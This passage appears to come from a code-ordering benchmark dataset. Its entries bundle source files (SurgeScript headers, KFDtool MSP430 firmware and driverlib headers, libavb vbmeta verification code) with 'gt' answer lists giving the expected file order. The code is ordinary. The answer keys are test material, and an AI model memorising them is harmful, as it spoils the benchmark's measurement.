\"surgescript/runtime/stack.h\"\n#include \"surgescript/runtime/variable.h\"\n#include \"surgescript/compiler/parser.h\"\n#include \"surgescript/util/transform.h\"\n#include \"surgescript/util/ssarray.h\"\n#include \"surgescript/util/util.h\"\n#include \"surgescript/util/version.h\"\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'surgescript/src/surgescript/runtime/tag_system.h'\n:\n\n#ifndef _SURGESCRIPT_RUNTIME_TAG_SYSTEM_H\n#define _SURGESCRIPT_RUNTIME_TAG_SYSTEM_H\n\ntypedef struct surgescript_tagsystem_t surgescript_tagsystem_t;\ntypedef struct surgescript_boundtagsystem_t surgescript_boundtagsystem_t;\n\n\nsurgescript_tagsystem_t* surgescript_tagsystem_create();\nsurgescript_tagsystem_t* surgescript_tagsystem_destroy(surgescript_tagsystem_t* tag_system);\n\n\nvoid surgescript_tagsystem_add_tag(surgescript_tagsystem_t* tag_system, const char* object_name, const char* tag_name);\nbool surgescript_tagsystem_has_tag(const surgescript_tagsystem_t* tag_system, const char* object_name, const char* tag_name);\n\n\nvoid surgescript_tagsystem_foreach_tag(const surgescript_tagsystem_t* tag_system, void* data, void (*callback)(const char*,void*));\nvoid surgescript_tagsystem_foreach_tagged_object(const surgescript_tagsystem_t* tag_system, const char* tag_name, void* data, void (*callback)(const char*,void*));\nvoid surgescript_tagsystem_foreach_tag_of_object(const surgescript_tagsystem_t* tag_system, const char* object_name, void* data, void (*callback)(const char*,void*));\n\n\nconst surgescript_boundtagsystem_t* surgescript_tagsystem_bind(surgescript_tagsystem_t* tag_system, const char* object_name);\nbool surgescript_boundtagsystem_has_tag(const surgescript_boundtagsystem_t* bound_tag_system, const char* tag_name);\n\n#endif\n",
        "gt": [
            "'surgescript/src/surgescript/runtime/tag_system.h'",
            "'surgescript/src/surgescript.h'",
            "'surgescript/src/main.c'"
        ]
    },
    {
        "files": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/tlv.h'",
            "'KFDtool/fw/KFDtool/InfoData.c'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'"
        ],
        "content": "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/tlv.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __MSP430WARE_TLV_H__\n\n#define __MSP430WARE_TLV_H__\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#ifdef __MSP430_HAS_TLV__\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\nextern \"C\"\n\n{\n\n#endif\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n\n\n\n\n\n\n\n\nstruct s_TLV_Die_Record {\n\n    uint32_t wafer_id;\n\n    uint16_t die_x_position;\n\n    uint16_t die_y_position;\n\n    uint16_t test_results;\n\n};\n\n\n\nstruct s_TLV_ADC_Cal_Data {\n\n    uint16_t adc_gain_factor;\n\n    int16_t adc_offset;\n\n    uint16_t adc_ref15_30_temp;\n\n    uint16_t adc_ref15_85_temp;\n\n    uint16_t adc_ref20_30_temp;\n\n    uint16_t adc_ref20_85_temp;\n\n    uint16_t adc_ref25_30_temp;\n\n    uint16_t adc_ref25_85_temp;\n\n};\n\n\n\nstruct s_TLV_Timer_D_Cal_Data {\n\n    uint16_t TDH0CTL1_64;\n\n    uint16_t TDH0CTL1_128;\n\n    uint16_t TDH0CTL1_200;\n\n    uint16_t TDH0CTL1_256;\n\n};\n\n\n\nstruct s_TLV_REF_Cal_Data {\n\n    uint16_t ref_ref15;\n\n    uint16_t ref_ref20;\n\n    uint16_t ref_ref25;\n\n};\n\n\n\nstruct s_Peripheral_Memory_Data {\n\n    uint16_t memory_1;\n\n    uint16_t memory_2;\n\n    uint16_t memory_3;\n\n    uint16_t memory_4;\n\n};\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define TLV_TAG_LDTAG                                                 TLV_LDTAG\n\n#define TLV_TAG_PDTAG                                                 TLV_PDTAG\n\n#define TLV_TAG_Reserved3                                         TLV_Reserved3\n\n#define TLV_TAG_Reserved4                                         TLV_Reserved4\n\n#define TLV_TAG_BLANK                                                 TLV_BLANK\n\n#define TLV_TAG_Reserved6                                         TLV_Reserved6\n\n#define TLV_TAG_Reserved7                                         TLV_Reserved7\n\n#define TLV_TAG_TAGEND                                               TLV_TAGEND\n\n#define TLV_TAG_TAGEXT                                               TLV_TAGEXT\n\n#define TLV_TAG_TIMER_D_CAL                                       TLV_TIMERDCAL\n\n#define TLV_DEVICE_ID_0                                                  0x1A04\n\n#define TLV_DEVICE_ID_1                                                  0x1A05\n\n#define TLV_TAG_DIERECORD                                         TLV_DIERECORD\n\n#define TLV_TAG_ADCCAL                                               TLV_ADCCAL\n\n#define TLV_TAG_ADC12CAL                                           TLV_ADC12CAL\n\n#define TLV_TAG_ADC10CAL                                           TLV_ADC10CAL\n\n#define TLV_TAG_REFCAL                                               TLV_REFCAL\n\n#define TLV_TAG_CTSD16CAL                                                  0x1D\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define TLV_PID_NO_MODULE                                                (0x00)\n\n#define TLV_PID_PORTMAPPING                                              (0x10)\n\n#define TLV_PID_MSP430CPUXV2                                             (0x23)\n\n#define TLV_PID_JTAG                                                     (0x09)\n\n#define TLV_PID_SBW                                                      (0x0F)\n\n#define TLV_PID_EEM_XS                                                   (0x02)\n\n#define TLV_PID_EEM_S                                                    (0x03)\n\n#define TLV_PID_EEM_M                                                    (0x04)\n\n#define TLV_PID_EEM_L                                                    (0x05)\n\n#define TLV_PID_PMM                                                      (0x30)\n\n#define TLV_PID_PMM_FR                                                   (0x32)\n\n#define TLV_PID_FCTL                                                     (0x39)\n\n#define TLV_PID_CRC16                                                    (0x3C)\n\n#define TLV_PID_CRC16_RB                                                 (0x3D)\n\n#define TLV_PID_WDT_A                                                    (0x40)\n\n#define TLV_PID_SFR                                                      (0x41)\n\n#define TLV_PID_SYS                                                      (0x42)\n\n#define TLV_PID_RAMCTL                                                   (0x44)\n\n#define TLV_PID_DMA_1                                                    (0x46)\n\n#define TLV_PID_DMA_3                                                    (0x47)\n\n#define TLV_PID_UCS                                                      (0x48)\n\n#define TLV_PID_DMA_6                                                    (0x4A)\n\n#define TLV_PID_DMA_2                                                    (0x4B)\n\n#define TLV_PID_PORT1_2                                                  (0x51)\n\n#define TLV_PID_PORT3_4                                                  (0x52)\n\n#define TLV_PID_PORT5_6                                                  (0x53)\n\n#define TLV_PID_PORT7_8                                                  (0x54)\n\n#define TLV_PID_PORT9_10                                                 (0x55)\n\n#define TLV_PID_PORT11_12                                                (0x56)\n\n#define TLV_PID_PORTU                                                    (0x5E)\n\n#define TLV_PID_PORTJ                                                    (0x5F)\n\n#define TLV_PID_TA2                                                      (0x60)\n\n#define TLV_PID_TA3                                                      (0x61)\n\n#define TLV_PID_TA5                                                      (0x62)\n\n#define TLV_PID_TA7                                                      (0x63)\n\n#define TLV_PID_TB3                                                      (0x65)\n\n#define TLV_PID_TB5                                                      (0x66)\n\n#define TLV_PID_TB7                                                      (0x67)\n\n#define TLV_PID_RTC                                                      (0x68)\n\n#define TLV_PID_BT_RTC                                                   (0x69)\n\n#define TLV_PID_BBS                                                      (0x6A)\n\n#define TLV_PID_RTC_B                                                    (0x6B)\n\n#define TLV_PID_TD2                                                      (0x6C)\n\n#define TLV_PID_TD3                                                      (0x6D)\n\n#define TLV_PID_TD5                                                      (0x6E)\n\n#define TLV_PID_TD7                                                      (0x6F)\n\n#define TLV_PID_TEC                                                      (0x70)\n\n#define TLV_PID_RTC_C                                                    (0x71)\n\n#define TLV_PID_AES                                                      (0x80)\n\n#define TLV_PID_MPY16                                                    (0x84)\n\n#define TLV_PID_MPY32                                                    (0x85)\n\n#define TLV_PID_MPU                                                      (0x86)\n\n#define TLV_PID_USCI_AB                                                  (0x90)\n\n#define TLV_PID_USCI_A                                                   (0x91)\n\n#define TLV_PID_USCI_B                                                   (0x92)\n\n#define TLV_PID_EUSCI_A                                                  (0x94)\n\n#define TLV_PID_EUSCI_B                                                  (0x95)\n\n#define TLV_PID_REF                                                      (0xA0)\n\n#define TLV_PID_COMP_B                                                   (0xA8)\n\n#define TLV_PID_COMP_D                                                   (0xA9)\n\n#define TLV_PID_USB                                                      (0x98)\n\n#define TLV_PID_LCD_B                                                    (0xB1)\n\n#define TLV_PID_LCD_C                                                    (0xB2)\n\n#define TLV_PID_DAC12_A                                                  (0xC0)\n\n#define TLV_PID_SD16_B_1                                                 (0xC8)\n\n#define TLV_PID_SD16_B_2                                                 (0xC9)\n\n#define TLV_PID_SD16_B_3                                                 (0xCA)\n\n#define TLV_PID_SD16_B_4                                                 (0xCB)\n\n#define TLV_PID_SD16_B_5                                                 (0xCC)\n\n#define TLV_PID_SD16_B_6                                                 (0xCD)\n\n#define TLV_PID_SD16_B_7                                                 (0xCE)\n\n#define TLV_PID_SD16_B_8                                                 (0xCF)\n\n#define TLV_PID_ADC12_A                                                  (0xD1)\n\n#define TLV_PID_ADC10_A                                                  (0xD3)\n\n#define TLV_PID_ADC10_B                                                  (0xD4)\n\n#define TLV_PID_SD16_A                                                   (0xD8)\n\n#define TLV_PID_TI_BSL                                                   (0xFC)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void TLV_getInfo(uint8_t tag,\n\n                        uint8_t instance,\n\n                        uint8_t *length,\n\n                        uint16_t **data_address);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint16_t TLV_getDeviceType(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint16_t TLV_getMemory(uint8_t instance);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint16_t TLV_getPeripheral(uint8_t tag,\n\n                                  uint8_t instance);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t TLV_getInterrupt(uint8_t tag);\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\n}\n\n#endif\n\n\n\n#endif\n\n#endif\n\n\n'KFDtool/fw/KFDtool/InfoData.c'\n:\n\n\n\n\n\n#include \"driverlib.h\"\n\n#include \"InfoData.h\"\n\n\n\n#define INFOB_START (0x1900)\n\n#define INFOB_LENGTH (128)\n\n\n\n#define INFOC_START (0x1880)\n\n#define INFOC_LENGTH (128)\n\n\n\nuint16_t idWriteModelIdHwRev(uint8_t hwId, uint8_t hwRevMaj, uint8_t hwRevMin)\n\n{\n\n    uint8_t data[5];\n\n\n\n    data[0] = 0x10;\n\n    data[1] = hwId;\n\n    data[2] = hwRevMaj;\n\n    data[3] = hwRevMin;\n\n    data[4] = 0x11;\n\n\n\n    uint16_t status;\n\n\n\n    do\n\n    {\n\n        FlashCtl_eraseSegment((uint8_t *)INFOB_START);\n\n        status = FlashCtl_performEraseCheck((uint8_t *)INFOB_START, INFOB_LENGTH);\n\n    } while (status == STATUS_FAIL);\n\n\n\n    FlashCtl_write8(data, (uint8_t *)INFOB_START, sizeof(data));\n\n\n\n    return 1;\n\n}\n\n\n\nuint16_t idWriteSerNum(uint8_t ser0, uint8_t ser1, uint8_t ser2, uint8_t ser3, uint8_t ser4, uint8_t ser5)\n\n{\n\n    uint8_t data[8];\n\n\n\n    data[0] = 0x20;\n\n    data[1] = ser0;\n\n    data[2] = ser1;\n\n    data[3] = ser2;\n\n    data[4] = ser3;\n\n    data[5] = ser4;\n\n    data[6] = ser5;\n\n    data[7] = 0x22;\n\n\n\n    uint16_t status;\n\n\n\n    do\n\n    {\n\n        FlashCtl_eraseSegment((uint8_t *)INFOC_START);\n\n        status = FlashCtl_performEraseCheck((uint8_t *)INFOC_START, INFOC_LENGTH);\n\n    } while (status == STATUS_FAIL);\n\n\n\n    FlashCtl_write8(data, (uint8_t *)INFOC_START, sizeof(data));\n\n\n\n    return 1;\n\n}\n\n\n\nuint16_t idReadModelId(uint8_t *hwId)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOB_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *hwId = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *flashPtr++;\n\n    footer = *flashPtr;\n\n\n\n    if (header == 0x10 && footer == 0x11)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n\nuint16_t idReadHwRev(uint8_t *hwRevMaj, uint8_t *hwRevMin)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOB_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *flashPtr++;\n\n    *hwRevMaj = *flashPtr;\n\n    *hwRevMin = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    footer = *flashPtr;\n\n\n\n    if (header == 0x10 && footer == 0x11)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n\nuint16_t idReadSerNum(uint8_t *ser0, uint8_t *ser1, uint8_t *ser2, uint8_t *ser3, uint8_t *ser4, uint8_t *ser5)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOC_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *ser0 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *ser1 = *flashPtr;\n\n    *ser2 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *ser3 = *flashPtr;\n\n    *ser4 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    footer = (*flashPtr >> 8);\n\n    *ser5 = *flashPtr;\n\n\n\n    if (header == 0x20 && footer == 0x22)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'\n:\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#include \"sysctl.h\"\n\n#include \"dma.h\"\n\n#include \"eusci_b_i2c.h\"\n\n#include \"rtc_b.h\"\n\n#include \"crc.h\"\n\n#include \"usci_a_uart.h\"\n\n#include \"flashctl.h\"\n\n#include \"ram.h\"\n\n#include \"dac12_a.h\"\n\n#include \"pmap.h\"\n\n#include \"mpy32.h\"\n\n#include \"rtc_a.h\"\n\n#include \"ucs.h\"\n\n#include \"aes.h\"\n\n#include \"tec.h\"\n\n#include \"usci_a_spi.h\"\n\n#include \"sfr.h\"\n\n#include \"wdt_a.h\"\n\n#include \"timer_a.h\"\n\n#include \"oa.h\"\n\n#include \"pmm.h\"\n\n#include \"lcd_b.h\"\n\n#include \"rtc_c.h\"\n\n#include \"adc10_a.h\"\n\n#include \"eusci_a_uart.h\"\n\n#include \"ctsd16.h\"\n\n#include \"usci_b_spi.h\"\n\n#include \"comp_b.h\"\n\n#include \"gpio.h\"\n\n#include \"tlv.h\"\n\n#include \"ldopwr.h\"\n\n#include \"adc12_a.h\"\n\n#include \"ref.h\"\n\n#include \"eusci_a_spi.h\"\n\n#include \"timer_b.h\"\n\n#include \"battbak.h\"\n\n#include \"usci_b_i2c.h\"\n\n#include \"eusci_b_spi.h\"\n\n#include \"timer_d.h\"\n\n#include \"lcd_c.h\"\n\n#include \"sd24_b.h\"\n\n",
        "gt": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/tlv.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/InfoData.c'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_crypto.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_vbmeta_image.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_vbmeta_image.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_crypto.h'\n:\n\n#if !defined(AVB_INSIDE_LIBAVB_H) && !defined(AVB_COMPILATION)\n#error \"Never include this file directly, include libavb.h instead.\"\n#endif\n\n#ifndef AVB_CRYPTO_H_\n#define AVB_CRYPTO_H_\n\n#include \"avb_sysdeps.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n#define AVB_RSA2048_NUM_BYTES 256\n\n\n#define AVB_RSA4096_NUM_BYTES 512\n\n\n#define AVB_RSA8192_NUM_BYTES 1024\n\n\n#define AVB_SHA256_DIGEST_SIZE 32\n\n\n#define AVB_SHA512_DIGEST_SIZE 64\n\n\ntypedef enum {\n  AVB_ALGORITHM_TYPE_NONE,\n  AVB_ALGORITHM_TYPE_SHA256_RSA2048,\n  AVB_ALGORITHM_TYPE_SHA256_RSA4096,\n  AVB_ALGORITHM_TYPE_SHA256_RSA8192,\n  AVB_ALGORITHM_TYPE_SHA512_RSA2048,\n  AVB_ALGORITHM_TYPE_SHA512_RSA4096,\n  AVB_ALGORITHM_TYPE_SHA512_RSA8192,\n  _AVB_ALGORITHM_NUM_TYPES\n} AvbAlgorithmType;\n\n\ntypedef struct {\n  const uint8_t* padding;\n  size_t padding_len;\n  size_t hash_len;\n} AvbAlgorithmData;\n\n\nconst AvbAlgorithmData* avb_get_algorithm_data(AvbAlgorithmType algorithm)\n    AVB_ATTR_WARN_UNUSED_RESULT;\n\n\ntypedef struct AvbRSAPublicKeyHeader {\n  uint32_t key_num_bits;\n  uint32_t n0inv;\n} AVB_ATTR_PACKED AvbRSAPublicKeyHeader;\n\n\nbool avb_rsa_public_key_header_validate_and_byteswap(\n    const AvbRSAPublicKeyHeader* src,\n    AvbRSAPublicKeyHeader* dest) AVB_ATTR_WARN_UNUSED_RESULT;\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_vbmeta_image.c'\n:\n\n#include \"avb_vbmeta_image.h\"\n#include \"avb_crypto.h\"\n#include \"avb_rsa.h\"\n#include \"avb_sha.h\"\n#include \"avb_util.h\"\n#include \"avb_version.h\"\n\nAvbVBMetaVerifyResult avb_vbmeta_image_verify(\n    const uint8_t* data,\n    size_t length,\n    const uint8_t** out_public_key_data,\n    size_t* out_public_key_length) {\n  AvbVBMetaVerifyResult ret;\n  AvbVBMetaImageHeader h;\n  uint8_t* computed_hash;\n  const AvbAlgorithmData* algorithm;\n  AvbSHA256Ctx sha256_ctx;\n  AvbSHA512Ctx sha512_ctx;\n  const uint8_t* header_block;\n  const uint8_t* authentication_block;\n  const uint8_t* auxiliary_block;\n  int verification_result;\n\n  ret = AVB_VBMETA_VERIFY_RESULT_INVALID_VBMETA_HEADER;\n\n  if (out_public_key_data != NULL) {\n    *out_public_key_data = NULL;\n  }\n  if (out_public_key_length != NULL) {\n    *out_public_key_length = 0;\n  }\n\n\n  if (avb_safe_memcmp(data, AVB_MAGIC, AVB_MAGIC_LEN) != 0) {\n    avb_error(\"Magic is incorrect.\\n\");\n    goto out;\n  }\n\n\n  if (length < sizeof(AvbVBMetaImageHeader)) {\n    avb_error(\"Length is smaller than header.\\n\");\n    goto out;\n  }\n  avb_vbmeta_image_header_to_host_byte_order((const AvbVBMetaImageHeader*)data,\n                                             &h);\n\n\n  if ((h.required_libavb_version_major != AVB_VERSION_MAJOR) ||\n      (h.required_libavb_version_minor > AVB_VERSION_MINOR)) {\n    avb_error(\"Mismatch between image version and libavb version.\\n\");\n    ret = AVB_VBMETA_VERIFY_RESULT_UNSUPPORTED_VERSION;\n    goto out;\n  }\n\n\n  if (h.release_string[AVB_RELEASE_STRING_SIZE - 1] != '\\0') {\n    avb_error(\"Release string does not end with a NUL byte.\\n\");\n    goto out;\n  }\n\n\n  if ((h.authentication_data_block_size & 0x3f) != 0 ||\n      (h.auxiliary_data_block_size & 0x3f) != 0) {\n    avb_error(\"Block size is not a multiple of 64.\\n\");\n    goto out;\n  }\n\n\n  uint64_t block_total = sizeof(AvbVBMetaImageHeader);\n  if (!avb_safe_add_to(&block_total, h.authentication_data_block_size) ||\n      !avb_safe_add_to(&block_total, h.auxiliary_data_block_size)) {\n    avb_error(\"Overflow while computing size of boot image.\\n\");\n    goto out;\n  }\n  if (block_total > length) {\n    avb_error(\"Block sizes add up to more than given length.\\n\");\n    goto out;\n  }\n\n  uintptr_t data_ptr = (uintptr_t)data;\n\n  if (!avb_safe_add(NULL, (uint64_t)data_ptr, length)) {\n    avb_error(\"Boot image location and length mismatch.\\n\");\n    goto out;\n  }\n\n\n  uint64_t hash_end;\n  if (!avb_safe_add(&hash_end, h.hash_offset, h.hash_size) ||\n      hash_end > h.authentication_data_block_size) {\n    avb_error(\"Hash is not entirely in its block.\\n\");\n    goto out;\n  }\n  uint64_t signature_end;\n  if (!avb_safe_add(&signature_end, h.signature_offset, h.signature_size) ||\n      signature_end > h.authentication_data_block_size) {\n    avb_error(\"Signature is not entirely in its block.\\n\");\n    goto out;\n  }\n\n\n  uint64_t pubkey_end;\n  if (!avb_safe_add(&pubkey_end, h.public_key_offset, h.public_key_size) ||\n      pubkey_end > h.auxiliary_data_block_size) {\n    avb_error(\"Public key is not entirely in its block.\\n\");\n    goto out;\n  }\n\n\n  if (h.public_key_metadata_size > 0) {\n    uint64_t pubkey_md_end;\n    if (!avb_safe_add(&pubkey_md_end,\n                      h.public_key_metadata_offset,\n                      h.public_key_metadata_size) ||\n        pubkey_md_end > h.auxiliary_data_block_size) {\n      avb_error(\"Public key metadata is not entirely in its block.\\n\");\n      goto out;\n    }\n  }\n\n\n  if (h.algorithm_type == AVB_ALGORITHM_TYPE_NONE) {\n    ret = AVB_VBMETA_VERIFY_RESULT_OK_NOT_SIGNED;\n    goto out;\n  }\n\n\n  algorithm = avb_get_algorithm_data(h.algorithm_type);\n  if (!algorithm) {\n    avb_error(\"Invalid or unknown algorithm.\\n\");\n    goto out;\n  }\n\n\n  if (h.hash_size != algorithm->hash_len) {\n    avb_error(\"Embedded hash has wrong size.\\n\");\n    goto out;\n  }\n\n\n\n  header_block = data;\n  authentication_block = header_block + sizeof(AvbVBMetaImageHeader);\n  auxiliary_block = authentication_block + h.authentication_data_block_size;\n\n  switch (h.algorithm_type) {\n\n    case AVB_ALGORITHM_TYPE_SHA256_RSA2048:\n    case AVB_ALGORITHM_TYPE_SHA256_RSA4096:\n    case AVB_ALGORITHM_TYPE_SHA256_RSA8192:\n      avb_sha256_init(&sha256_ctx);\n      avb_sha256_update(\n          &sha256_ctx, header_block, sizeof(AvbVBMetaImageHeader));\n      avb_sha256_update(\n          &sha256_ctx, auxiliary_block, h.auxiliary_data_block_size);\n      computed_hash = avb_sha256_final(&sha256_ctx);\n      break;\n\n    case AVB_ALGORITHM_TYPE_SHA512_RSA2048:\n    case AVB_ALGORITHM_TYPE_SHA512_RSA4096:\n    case AVB_ALGORITHM_TYPE_SHA512_RSA8192:\n      avb_sha512_init(&sha512_ctx);\n      avb_sha512_update(\n          &sha512_ctx, header_block, sizeof(AvbVBMetaImageHeader));\n      avb_sha512_update(\n          &sha512_ctx, auxiliary_block, h.auxiliary_data_block_size);\n      computed_hash = avb_sha512_final(&sha512_ctx);\n      break;\n    default:\n      avb_error(\"Unknown algorithm.\\n\");\n      goto out;\n  }\n\n  if (avb_safe_memcmp(authentication_block + h.hash_offset,\n                      computed_hash,\n                      h.hash_size) != 0) {\n    avb_error(\"Hash does not match!\\n\");\n    ret = AVB_VBMETA_VERIFY_RESULT_HASH_MISMATCH;\n    goto out;\n  }\n\n  verification_result =\n      avb_rsa_verify(auxiliary_block + h.public_key_offset,\n                     h.public_key_size,\n                     authentication_block + h.signature_offset,\n                     h.signature_size,\n                     authentication_block + h.hash_offset,\n                     h.hash_size,\n                     algorithm->padding,\n                     algorithm->padding_len);\n\n  if (verification_result == 0) {\n    ret = AVB_VBMETA_VERIFY_RESULT_SIGNATURE_MISMATCH;\n    goto out;\n  }\n\n  if (h.public_key_size > 0) {\n    if (out_public_key_data != NULL) {\n      *out_public_key_data = auxiliary_block + h.public_key_offset;\n    }\n    if (out_public_key_length != NULL) {\n      *out_public_key_length = h.public_key_size;\n    }\n  }\n\n  ret = AVB_VBMETA_VERIFY_RESULT_OK;\n\nout:\n  return ret;\n}\n\nvoid avb_vbmeta_image_header_to_host_byte_order(const AvbVBMetaImageHeader* src,\n                                                AvbVBMetaImageHeader* dest) {\n  avb_memcpy(dest, src, sizeof(AvbVBMetaImageHeader));\n\n  dest->required_libavb_version_major =\n      avb_be32toh(dest->required_libavb_version_major);\n  dest->required_libavb_version_minor =\n      avb_be32toh(dest->required_libavb_version_minor);\n\n  dest->authentication_data_block_size =\n      avb_be64toh(dest->authentication_data_block_size);\n  dest->auxiliary_data_block_size =\n      avb_be64toh(dest->auxiliary_data_block_size);\n\n  dest->algorithm_type = avb_be32toh(dest->algorithm_type);\n\n  dest->hash_offset = avb_be64toh(dest->hash_offset);\n  dest->hash_size = avb_be64toh(dest->hash_size);\n\n  dest->signature_offset = avb_be64toh(dest->signature_offset);\n  dest->signature_size = avb_be64toh(dest->signature_size);\n\n  dest->public_key_offset = avb_be64toh(dest->public_key_offset);\n  dest->public_key_size = avb_be64toh(dest->public_key_size);\n\n  dest->public_key_metadata_offset =\n      avb_be64toh(dest->public_key_metadata_offset);\n  dest->public_key_metadata_size = avb_be64toh(dest->public_key_metadata_size);\n\n  dest->descriptors_offset = avb_be64toh(dest->descriptors_offset);\n  dest->descriptors_size = avb_be64toh(dest->descriptors_size);\n\n  dest->rollback_index = avb_be64toh(dest->rollback_index);\n  dest->flags = avb_be32toh(dest->flags);\n}\n\nconst char* avb_vbmeta_verify_result_to_string(AvbVBMetaVerifyResult result) {\n  const char* ret = NULL;\n\n  switch (result) {\n    case AVB_VBMETA_VERIFY_RESULT_OK:\n      ret = \"OK\";\n      break;\n    case AVB_VBMETA_VERIFY_RESULT_OK_NOT_SIGNED:\n      ret = \"OK_NOT_SIGNED\";\n      break;\n    case AVB_VBMETA_VERIFY_RESULT_INVALID_VBMETA_HEADER:\n      ret = \"INVALID_VBMETA_HEADER\";\n      break;\n    case AVB_VBMETA_VERIFY_RESULT_UNSUPPORTED_VERSION:\n      ret = \"UNSUPPORTED_VERSION\";\n      break;\n    case AVB_VBMETA_VERIFY_RESULT_HASH_MISMATCH:\n      ret = \"HASH_MISMATCH\";\n      break;\n    case AVB_VBMETA_VERIFY_RESULT_SIGNATURE_MISMATCH:\n      ret = \"SIGNATURE_MISMATCH\";\n      break;\n\n  }\n\n  if (ret == NULL) {\n    avb_error(\"Unknown AvbVBMetaVerifyResult value.\\n\");\n    ret = \"(unknown)\";\n  }\n\n  return ret;\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_vbmeta_image.h'\n:\n\n#if !defined(AVB_INSIDE_LIBAVB_H) && !defined(AVB_COMPILATION)\n#error \"Never include this file directly, include libavb.h instead.\"\n#endif\n\n#ifndef AVB_VBMETA_IMAGE_H_\n#define AVB_VBMETA_IMAGE_H_\n\n#include \"avb_sysdeps.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include \"avb_crypto.h\"\n#include \"avb_descriptor.h\"\n\n\n#define AVB_VBMETA_IMAGE_HEADER_SIZE 256\n\n\n#define AVB_MAGIC \"AVB0\"\n#define AVB_MAGIC_LEN 4\n\n\n#define AVB_RELEASE_STRING_SIZE 48\n\n\ntypedef enum {\n  AVB_VBMETA_IMAGE_FLAGS_HASHTREE_DISABLED = (1 << 0),\n  AVB_VBMETA_IMAGE_FLAGS_VERIFICATION_DISABLED = (1 << 1)\n} AvbVBMetaImageFlags;\n\n\ntypedef struct AvbVBMetaImageHeader {\n\n  uint8_t magic[AVB_MAGIC_LEN];\n\n\n  uint32_t required_libavb_version_major;\n\n  uint32_t required_libavb_version_minor;\n\n\n  uint64_t authentication_data_block_size;\n\n  uint64_t auxiliary_data_block_size;\n\n\n  uint32_t algorithm_type;\n\n\n  uint64_t hash_offset;\n\n  uint64_t hash_size;\n\n\n  uint64_t signature_offset;\n\n  uint64_t signature_size;\n\n\n  uint64_t public_key_offset;\n\n  uint64_t public_key_size;\n\n\n  uint64_t public_key_metadata_offset;\n\n  